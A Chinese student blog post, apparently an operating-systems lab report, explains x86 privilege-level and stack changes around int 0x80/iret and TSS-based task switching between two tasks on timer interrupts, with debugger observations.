<p><img src="./images/os%E5%AE%9E%E9%AA%8Clab2%20ae8e52494f45454d897cfc76e52a6380/Untitled.png" alt="Untitled"></p>
<p><img src="./images/os%E5%AE%9E%E9%AA%8Clab2%20ae8e52494f45454d897cfc76e52a6380/Untitled%201.png" alt="Untitled"></p>
<p>切换后：</p>
<p><img src="./images/os%E5%AE%9E%E9%AA%8Clab2%20ae8e52494f45454d897cfc76e52a6380/Untitled%202.png" alt="Untitled"></p>
<p><img src="./images/os%E5%AE%9E%E9%AA%8Clab2%20ae8e52494f45454d897cfc76e52a6380/Untitled%203.png" alt="Untitled"></p>
<p>system_interrupt函数是内核函数，通过iret返回到用户态，iret来进行栈切换的过程：</p>
<p>iret等价于：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pop ip</span><br><span class="line">pop cs</span><br><span class="line">pop eflags</span><br><span class="line">pop esp</span><br><span class="line">pop ss</span><br></pre></td></tr></table></figure>
<h2 id="2-当进入和退出-system-interrupt-时，都发生了模式切换，请总结模式切换时，特权级是如何改变的？栈切换吗？如何进行切换的？">2. 当进入和退出 <code>system_interrupt</code> 时，都发生了模式切换，请总结模式切换时，特权级是如何改变的？栈切换吗？如何进行切换的？</h2>
<p><strong>进入system_interrupt的时候</strong>，会改变cs和ss分别为0x8、0x10，这个切换是由硬件切换的，cs、ss这两个选择子是由操作系统启动的时候事先设定好的。此时栈有东西被压栈了，压栈的顺序为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">EIP &lt;- ESP</span><br><span class="line">CS</span><br><span class="line">eflags</span><br><span class="line">esp</span><br><span class="line">ss</span><br></pre></td></tr></table></figure>
<p>这里通过压栈报错了cs和ss，返回的时候可以通过iret来进行还原。</p>
<p><strong>退出system_interrupt的时候</strong>，通过iret返回，iret会将栈内的数据pop出来恢复寄存器：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pop ip</span><br><span class="line">pop cs</span><br><span class="line">pop eflags</span><br><span class="line">pop esp</span><br><span class="line">pop ss</span><br></pre></td></tr></table></figure>
<p><strong>总结进入的时候通过硬件自动切换特权级，而退出的时候则通过栈来进行特权级的切换。</strong></p>
<p>细节：</p>
<p>进入是从用户态进入到内核态，通过int80中断进入了，推出是从内核态进入到用户态，通过iret返回。</p>
<p>遇到int80，先将东西压栈，之后返回(看看压了什么</p>
<p><img src="./images/os%E5%AE%9E%E9%AA%8Clab2%20ae8e52494f45454d897cfc76e52a6380/Untitled%204.png" alt="Untitled"></p>
<p>下一条指令地址为0x10eb</p>
<p>让我们看看栈里都压了什么</p>
<p>观察新栈，改变的是esp,eip,cs,ss</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">EIP &lt;- ESP</span><br><span class="line">CS</span><br><span class="line">eflags</span><br><span class="line">esp</span><br><span class="line">ss</span><br><span class="line"></span><br><span class="line">同时和ret返回的东西刚好对应上</span><br><span class="line">pop ip</span><br><span class="line">pop cs</span><br><span class="line">pop eflags</span><br><span class="line">pop esp</span><br><span class="line">pop ss</span><br></pre></td></tr></table></figure>
<h2 id="3-当进入和退出-system-interrupt-时，都发生了模式切换，请总结模式切换时，特权级是如何改变的？栈切换吗？如何进行切换的？">3. 当进入和退出 <code>system_interrupt</code> 时，都发生了模式切换，请总结模式切换时，特权级是如何改变的？栈切换吗？如何进行切换的？</h2>
<p>当时钟中断发生，进入到 <code>timer_interrupt</code> 程序，请详细记录从任务 <code>0</code> 切换到任务 <code>1</code> 的过程。</p>
<p>调试方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">断点打在0x12b(不知道为何0x12a断不下来</span><br></pre></td></tr></table></figure>
<p>timer_interrupt是内核函数</p>
<p>所以会先让DS指向内核数据段</p>
<p><img src="./images/os%E5%AE%9E%E9%AA%8Clab2%20ae8e52494f45454d897cfc76e52a6380/Untitled%205.png" alt="Untitled"></p>
<p>然后设置允许其他硬件中断</p>
<p><img src="./images/os%E5%AE%9E%E9%AA%8Clab2%20ae8e52494f45454d897cfc76e52a6380/Untitled%206.png" alt="Untitled"></p>
<p>然后判断当前任务(框框处为比较</p>
<p><img src="./images/os%E5%AE%9E%E9%AA%8Clab2%20ae8e52494f45454d897cfc76e52a6380/Untitled%207.png" alt="Untitled"></p>
<p>jmpf功效为跳转到别的任务，会进行任务的切换。</p>
<p>jmpf会自动地进行旧任务TSS的保存，以及切换到新任务的TSS，并从新任务的TSS中加载上下文到寄存器。</p>
<p>进行任务跳转的时候会把寄存器等值存到TSS中：</p>
<p><img src="./images/os%E5%AE%9E%E9%AA%8Clab2%20ae8e52494f45454d897cfc76e52a6380/Untitled%208.png" alt="Untitled"></p>
<p><img src="./images/os%E5%AE%9E%E9%AA%8Clab2%20ae8e52494f45454d897cfc76e52a6380/Untitled%209.png" alt="Untitled"></p>
<p>返回时进入到：</p>
<p><img src="./images/os%E5%AE%9E%E9%AA%8Clab2%20ae8e52494f45454d897cfc76e52a6380/Untitled%2010.png" alt="Untitled"></p>
<h2 id="4-又过了-10ms-，从任务1切换回到任务-0-，整个流程是怎样的？-TSS-是如何变化的？各个寄存器的值是如何变化的？">4. 又过了 <code>10ms</code> ，从任务1切换回到任务 <code>0</code> ，整个流程是怎样的？ <code>TSS</code> 是如何变化的？各个寄存器的值是如何变化的？</h2>
<p>10ms之后，硬件再次发送中断，程序将执行到timer_interrupt函数中。</p>
<p>执行完timer_interrupt的一系列汇编之后，同样来到jmpf汇编中。</p>
<p><img src="./images/os%E5%AE%9E%E9%AA%8Clab2%20ae8e52494f45454d897cfc76e52a6380/Untitled%2011.png" alt="Untitled"></p>
<p>跳转的时候会保存旧的TSS，并且用要新任务的tss来恢复寄存器。</p>
<p>旧TSS</p>
<p>tr:0x30</p>
<p><img src="./images/os%E5%AE%9E%E9%AA%8Clab2%20ae8e52494f45454d897cfc76e52a6380/Untitled%2012.png" alt="Untitled"></p>
<p><img src="./images/os%E5%AE%9E%E9%AA%8Clab2%20ae8e52494f45454d897cfc76e52a6380/Untitled%2013.png" alt="Untitled"></p>
<p>新TSS</p>
<p>tr:0x20</p>
<p><img src="./images/os%E5%AE%9E%E9%AA%8Clab2%20ae8e52494f45454d897cfc76e52a6380/Untitled%2014.png" alt="Untitled"></p>
<p><img src="./images/os%E5%AE%9E%E9%AA%8Clab2%20ae8e52494f45454d897cfc76e52a6380/Untitled%2015.png" alt="Untitled"></p>
<p>跳转到新任务的时候，各个寄存器的值会和新任务的TSS里面的数值一致，确认跳转到新任务。</p>
<h2 id="5-请详细总结任务切换的过程。">5. 请详细总结任务切换的过程。</h2>
<p>任务切换关键在于：上下文保存、新任务的选择、上下文的恢复(新任务的上下文)、执行新任务。</p>
<p><img src="./images/os%E5%AE%9E%E9%AA%8Clab2%20ae8e52494f45454d897cfc76e52a6380/Untitled%2016.png" alt="Untitled"></p>
<p>其中TSS在整个过程中起到了重要的作用，任务切换的时候，<strong>先将当前的上下文保存到当前任务的TSS中，然后根据要跳转的新任务选择好TSS选择子，然后进行上下文恢复</strong>，如此，就实现了当前的寄存器/堆栈完全是新任务的环境，之后即可执行新任务，新任务执行完毕之后会返回(当然本实验是死循环打印字符不会返回，而是通过中断来进行任务切换回来)，任务返回的时候和切换是类似的，同样是TSS的保存以及上下文恢复，通过TSS即可完成上下文的保存和任务的切换!</p>
<p>附：</p>
<p>调试方法：通过打断点的方式即可完成调试</p>
<p>timer_interrupt断点要打在0x12b，任务跳转之后不是跳转到任务的代码而是0x163处的代码是正常的，因为任务跳转返回的是被中断的时候的下一条指令的地址，而任务被打断就是在timer_interrupt的jmpf指令处被打断的，此时EIP被保存为下一条指令地址。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="hkbin"
      src="/images/header.png">
  <p class="site-author-name" itemprop="name">hkbin</p>
  <div class="site-description" itemprop="description">hkbin hkbin hkbin</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">29</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">6</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">38</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="/17779938@qq.com" title="QQ → 17779938@qq.com"><i class="fab fa-stack-overflow fa-fw"></i>QQ</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://github.com/Hkhanbing" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Hkhanbing" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">hkbin</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
      <span class="post-meta-item-text">站点总字数：</span>
    <span title="站点总字数">46k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
    <span title="站点阅读时长">2:47</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>


    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>



        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  
  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>


  <script defer src="/lib/three/three.min.js"></script>
    <script defer src="/lib/three/canvas_lines.min.js"></script>


  















  

  

  

</body>
</html>
